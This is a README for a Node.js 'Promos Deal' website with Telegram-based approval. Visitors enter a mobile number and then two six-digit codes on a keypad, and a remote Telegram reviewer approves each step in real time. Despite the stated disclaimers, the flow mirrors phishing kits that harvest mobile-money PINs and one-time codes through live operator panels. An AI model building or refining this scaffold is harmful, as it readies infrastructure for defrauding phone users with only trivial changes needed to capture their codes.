# Promos Deal — Website v3

A functional **website, not an app**, using HTML, existing navy/white/light-blue CSS, browser JavaScript, a Node.js `server.js` backend, SQLite, and Telegram approvals. No npm dependencies or admin page. The **original `styles.css` is unchanged** from version 2.

## Start in VS Code

1. Install **Node.js 22.13+**.
2. Unzip and open **`promos-deal-website-v3`** in VS Code. (Open the folder containing `package.json`.)
3. In Terminal, run `npm start`.
4. Open **http://localhost:3000**. Do not open `index.html` directly or use Live Server; this site needs `server.js`.
5. If a port is taken, copy `.env.example` to `.env` and change `PORT` (e.g. `3001`), then restart.

## Visitor flow

1. A 10-second welcome screen appears with a loading ring (plus an optional skip button).
2. **First page:** visitor selects a country or territory (249 choices), enters a national mobile number, then creates **any six-digit promotional reference** and agrees to the privacy notice. The reference is independent of the phone number. A Telegram reviewer sees the request ID, **masked phone**, and **`Promo digits submitted: ••••••`**, with **Approve / Reject** buttons.
3. If approved, the user sees the **second page**, entering another six-digit promotional reference of their own choosing through the numeric keypad. Another Telegram message prompts **Approve / Reject**.
4. On approval, the visitor sees the confirmation page. Rejections allow retry. The page automatically checks approval status every 2.5 seconds.

**Important:** These are promotional reference placeholders chosen by the visitor. They are **not** banking/mobile-money PINs, passwords, SMS codes, or authentication codes. The server checks only that they contain six numeric digits, **discards them immediately**, and does not store or forward the digits to Telegram. Telegram reviewers **approve promotional submissions**, not the correctness of a six-digit code.

## Telegram bot setup / fix notifications

1. **Revoke the old bot token previously pasted into chat** with Telegram's **@BotFather `/revoke`** and create a replacement. Do not reuse an exposed token.
2. In Telegram, open a private chat with **your bot** and press **Start**, or type `/start`.
3. Obtain **your own personal Telegram chat ID** (the recipient chat ID). **The ID of the bot itself is not the recipient chat ID**. If you entered your bot ID in `chatId`, notifications will fail.
4. Copy **`bots.example.json`** to **`bots.json`** in the **same folder as `server.js`**. Enter each new token and the corresponding private reviewer chat ID:

   ```json
   [
     { "name": "Reviewer 1", "token": "NEW_BOT_TOKEN_1", "chatId": "REVIEWER_1_TELEGRAM_CHAT_ID" },
     { "name": "Reviewer 2", "token": "NEW_BOT_TOKEN_2", "chatId": "REVIEWER_2_TELEGRAM_CHAT_ID" }
   ]
   ```

   Keep each token unique. Add as many different bots as you need, one per array entry, and restart the server after editing `bots.json`.
5. In the VS Code terminal, run **`npm run check:telegram`**. This sends a diagnostic message to each configured private chat and tells you which configuration needs fixing. Then run **`npm start`**.
6. Check **http://localhost:3000/health** to see the count of configured Telegram bots. The server also logs `Telegram bot ready: ...`, or specific send/polling errors in its console.
7. Submit a new promotional request to receive a Telegram message. Tap **Approve** or **Reject** from the configured Telegram account; the visitor's page updates automatically.

If Telegram reports a webhook conflict (`409 Conflict`), the bot may already have a webhook or another running polling client. This site uses `getUpdates` polling. Remove the old webhook from Telegram or stop the other application using the same bot (only if you control that integration), then restart this server. Keep tokens in **`bots.json`**, `.env`, or cloud **secrets**, never in `public/`.

### When no Telegram bot is configured

For local preview only, the default `AUTO_APPROVE_WITHOUT_BOT=1` automatically progresses through both stages, allowing you to test the site. **For public use, set `AUTO_APPROVE_WITHOUT_BOT=0` and configure at least one working bot** so approvals cannot be bypassed. With `AUTO_APPROVE_WITHOUT_BOT=0` but no bot, submissions remain pending; the terminal warns about this.

### Hosting

Use hosting with **Node.js 22.13+**, a persistent disk for `data/`, outbound HTTPS access to `api.telegram.org`, and an HTTPS URL. Use:

- Start command: `npm start`
- Environment: `HOST=0.0.0.0`, `SECURE_COOKIES=1`, `AUTO_APPROVE_WITHOUT_BOT=0`, and the host-provided `PORT`.
- Configure bots using private `TELEGRAM_BOTS_JSON` environment variable (JSON array) **instead of** `bots.json` on cloud hosts. It takes precedence.
- Never publish `.env`, `bots.json`, or the `data/` folder.

The database retains phone numbers and review metadata for up to 30 days; **it does not retain either promotional reference**, and the site's browser/backend do not verify phone ownership. Before production launch, add a privacy policy, hosting monitoring, IP-level rate limits, and any required consumer disclosures. Do not imply a confirmed promotion or affiliation with a payment provider unless authorized.

## Files

```text
promos-deal-website-v3/
├── server.js                # Node backend, Telegram Approve/Reject, SQLite
├── check-telegram.js        # Diagnose Telegram bot/chat configuration
├── package.json             # npm start, npm run check:telegram
├── .env.example             # Private runtime settings template
├── bots.example.json        # Template for multiple bots
├── .gitignore
├── README.md
└── public/
    ├── index.html           # Promotional welcome and main layout
    ├── app.js               # Country selector, form, keypad, waiting, status updates
    ├── countries.json       # 249 country or territory dialing prefixes
    └── styles.css           # UNCHANGED from previous website
```
